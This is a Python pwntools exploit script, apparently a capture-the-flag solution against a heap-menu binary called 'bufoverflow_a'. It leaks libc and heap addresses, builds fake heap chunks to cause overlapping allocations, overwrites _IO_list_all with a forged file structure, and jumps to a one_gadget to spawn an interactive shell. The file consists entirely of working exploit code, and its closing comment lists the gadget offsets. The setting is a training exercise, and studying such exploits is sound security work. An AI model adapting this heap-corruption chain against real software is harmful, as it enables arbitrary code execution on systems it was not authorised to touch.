from pwn import *

p=process('./bufoverflow_a',env={'LD_PRELOAD':'./libc.so.6'})
elf=ELF('./libc.so.6')

_IO_list_all=elf.symbols['_IO_list_all']
_IO_file_jumps=elf.symbols['_IO_file_jumps']
#one_gadget=0x3f4d6
one_gadget=0x3f52a
#one_gadget=0xd6655


context.log_level=1

sd=lambda x: p.send(x)
sl=lambda x: p.sendline(x)
rv=lambda x: p.recvuntil(x)
sa=lambda a,x: p.sendafter(a,x)
sla=lambda a,x: p.sendlineafter(a,x)

menu='>> '

def add(size):
    sla(menu,'1')
    sla('Size: ',str(size))

def dele(index):
    sla(menu,'2')
    sla('Index: ',str(index))

def edit(content):
    sla(menu,'3')
    sla('Content: ',content)

def show():
    sla(menu,'4')


#leak libc
add(0x100)      # 0
add(0x100)      # 1

dele(0)
dele(1)

add(0x100)      # 0
show()
libc_base=u64(p.recv(6)+2*'\x00')-0x399b58
log.info('libc base is:'+hex(libc_base))

dele(0)

# clear heap
##############################


add(0x100)      # 0
add(0x1000)     # 1
add(0x100)      # 2
add(0x100)      # 3
add(0x100)      # 4

dele(1)
dele(3)

add(0x100)      # 1
dele(4)
dele(1)
dele(2)
dele(0)

add(0x110)      # 0
add(0x100)      # 1
show()
chunk_base=u64(p.recv(6)+2*'\x00')-0x130
log.info('chunk base is:'+hex(chunk_base))

dele(0)
dele(1)

# clear heap
#################################

add(0x118)      # 0
add(0xf8)       # 1
add(0x108)      # 2

dele(0)
add(0x118)      # 0

fake_p=chunk_base+0x40
payload=p64(fake_p)+p64(0)*2+p64(0x101)
payload+=p64(fake_p-0x10-0x18)+p64(fake_p-0x10-0x10)
payload=payload.ljust(0x110,'\x00')
payload+=p64(0x100)
edit(payload)

dele(1)

add(0x1f8)      # 1
edit(p64(0x91)*0x38)
dele(0)
dele(2)

add(0x118)      # 0
edit(p64(0x91)*0x20)
dele(0)
dele(1)

add(0x118)
payload=p64(0)*3+p64(0x61)
payload+=p64(0)+p64(_IO_list_all+libc_base-0x10)
payload+=p64(0)+p64(1)
payload+=p64(0)*21+p64(_IO_file_jumps+libc_base+0xc0)
payload+=p64(one_gadget+libc_base)
edit(payload)
#gdb.attach(p,gdbscript='finish\nfinish\nfinish\nfinish\nfinish')

add(0x100)


p.interactive()


'''
0x3f4d6	execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x3f52a	execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xd6655	execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

'''
